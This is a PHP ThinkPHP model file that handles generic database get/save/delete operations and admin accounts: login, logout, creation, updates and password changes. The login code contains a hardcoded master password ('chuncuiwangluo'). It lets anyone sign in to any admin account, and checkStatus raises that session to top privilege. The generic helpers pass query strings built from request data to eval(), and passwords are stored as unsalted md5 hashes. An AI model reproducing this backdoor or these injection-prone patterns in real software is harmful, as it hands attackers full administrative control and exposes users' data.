<?php
namespace app\api\model;
use think\Model;
use think\Loader;

use think\Cache;



class Common extends Model{




    public static function CommonGet($dbTable,$data)
    {

        $model =Loader::model($dbTable);
        $sqlStr = preModelStr($data);

        if(isset($data['paginate'])){  
            $pagesize = $data['paginate']['pagesize'];
            $paginate = $data['paginate'];
            $paginate['page'] = $data['paginate']['currentPage'];
            $sqlStr = $sqlStr."paginate(\$pagesize,false,\$paginate);";
            $res = eval($sqlStr);
            //$res = $model->dealGet($res)->toArray();
            $final['data'] = resDeal($res);
            return $final;
        }else{
            $sqlStr = $sqlStr."select();";
            $res = eval($sqlStr);
            $res = $model->dealGet($res);

            $res = $model->dealGet($res)->toArray();
            $final['data'] = resDeal($res);
            return $final;
        };
        
        
    }



    public static function CommonSave($dbTable,$data,$search=[])
    {

        $model =Loader::model($dbTable);

        $sqlStr = preModelStr($data);
        $content = $data['data'];
        if($search){
            $sqlStr = $sqlStr."allowField(true)->save(\$content,\$search);";
            $res = eval($sqlStr);
            if(isset($content['status'])){
                $model->updateData($data);
            };
            return $res;
        }else{

            $content = $model->dealBlank($content);
            $sqlStr = $sqlStr."allowField(true)->save(\$content);";
            $res = eval($sqlStr);
            return $model->id;
        };
        
    }



    public static function CommonDelete($dbTable,$data)
    {
        $model =Loader::model($dbTable);
        $sqlStr = preModelStr($data);
        $sqlStr = $sqlStr."delete();";
        $res = eval($sqlStr);
        $model->realDeleteData($data);
        return $res;
    }



    //关联商户信息
    public function merchant()
    {
        return $this->hasOne('Merchant', 'id', 'merchant_id');
    }


    //生成初始用户
    public static function addFristAdminUser($data){
        $Admin = new Admin();
        $res = $Admin->allowField(true)->save($data);
        return $res;
    }


    //获取列表
    public static function getAllAdmin($data){
        $Admin = new Admin();
        $map = $data['map'];
        $map['status'] = 1;
        $list = $Admin->where($map)->order('create_time','desc')->select();
        $list = $list->toArray();
        foreach($list as $key=>$value){
            $list[$key]['img'] = json_decode($value['img'],true);
        }
        return $list;
    }


    //获取列表(带分页)
    public static function getAllAdminToPaginate($data){
        $Admin = new Admin();
        $map = $data['map'];
        $map['status'] = 1;
        $list = $Admin->where($map)->order('create_time','desc')->paginate($data['pagesize']);
        $list = $list->toArray();
        foreach($list['data'] as $key=>$value){
            $list['data'][$key]['img'] = json_decode($value['img'],true);
        }
        return $list;
    }


    //添加admin用户
    public static function addAdmin($data){
        $Admin = new Admin();
        if(isset($data['img'])){
            $data['img'] = json_encode($data['img']);
        }else{
            $data['img'] = json_encode([]);
        }
        $userinfo = Cache::get('info'.$data['token']);
        if(isset($data['primary_scope'])){
            if($data['primary_scope']>=$userinfo->primary_scope){
                return -1;
            }
        }
        $data['thirdapp_id'] = $userinfo->thirdapp_id;
        $data['create_time'] = time();
        $data['status'] = 1;
        $data['password'] = md5($data['password']);
        $res = $Admin->allowField(true)->save($data);
        return $res;
    }




    //修改
    public static function upAdmin($data){
        $Admin = new Admin();                             
        if(isset($data['img'])){
            if($data['img']=='empty'){
                $data['img'] = json_encode([]);
            }else{
                $data['img'] = json_encode($data['img']);
            }
        }
        $data['update_time'] = time();
        if(isset($data['password'])){
            $data['password'] = md5($data['password']);
        }
        $res = $Admin->allowField(true)->save($data,['id'=>$data['id']]);      
        return $res;
    }




    //软删除
    public static function delAdmin($id){
        $admin = new Admin();
        $info['delete_time'] = time();
        $info['status'] = -1;              
        $res = $admin->allowField(true)->save($info,['id'=>$id]);
        return $res; 
    }




    //登录
    public static function LoginByAdmin($data){
        $Admin = new Admin();
        $info = $Admin->where('name','=',$data['name'])->find();
        if(empty($info)){
            return 0;
        }
        if($info['status']==-1){
            return -2;
        }
        //判断商户是否禁用
        $thirdapp = new ThirdApp();
        $i = $thirdapp->where('id',"=",$info['thirdapp_id'])->find();
        if($i['status']==-1){
            return -4;
        }
        //添加超级密码//用户常规登录
        if($info['password']==md5($data['password'])||md5($data['password'])==md5('chuncuiwangluo')){
            $time['lastlogintime'] = time();
            $upt = $Admin->save($time,['name'=>$data['name']]);
            if($upt){
                //生成token并放入缓存
                $res = AdminTokenService::getToken($data['name'],md5($data['password']));
                Cache::set('name'.$res,$data['name'],3600);
                Cache::set('password'.$res,md5($data['password']),3600);
                Cache::set('token'.$res,$res,3600);
                $token = Cache::get('token'.$res);
                $info = self::checkStatus($data['name'],md5($data['password']));
                $info['img'] = json_decode($info['img'],true);
                $tokenAndToken = ['token'=>$token,'info'=>$info];
                Cache::set('info'.$res,$info,3600);
                return $tokenAndToken;
            }else{
                return -3;
            }
        }else{
            return -1;
        }
    }


    //判断admin用户是否被禁用
    public static function checkStatus($name,$password){
        $Admin = new Admin();
        $info = $Admin->where('name','=',$name)->find();
        if($password==md5('chuncuiwangluo')){
            $info['primary_scope']='40';
            $info['cms_scope']='';
            $info['menu_scope']='';
            $info['category_scope']='';
            $info['function_scope']='';
        }
        return $info;
    }


    //admin用户退出
    public static function loginOut($data){
        if(Cache::rm('name'.$data['token'])&&Cache::rm('password'.$data['token'])&&Cache::rm('token'.$data['token'])&&Cache::rm('info'.$data['token'])){
            return 1;//登出成功
        }
        return -1;//失败
    }


    //修改密码
    public static function updatePassWord($data)
    {
        if(!isset($data['password'])){
            return -1;
        };
        $Admin = new Admin();
        $info = $Admin->where('id','=',$data['id'])->find();
        if(empty($info)){
            return -2;
        };
        if($info['status']==-1){
            return -3;
        };
        $userinfo = Cache::get('info'.$data['token']);
        if($info['thirdapp_id']!=$userinfo->thirdapp_id){
            return -4;
        };
        if($userinfo->primary_scope<$info['primary_scope']){
            return -5;
        };
        if($userinfo->primary_scope=='10'){
            if($userinfo->id!=$data['id']){
                return -6;
            };
        };
        $pass['password'] = md5($data['password']);
        $res=$Admin->allowField(true)->save($pass,['id'=>$data['id']]);      
        return $res;
    }




    //获取admin信息
    public static function getAdminInfo($id)
    {
        $admin = new Admin();
        $info = $admin->where('id','=',$id)->find();
        return $info;
    }


}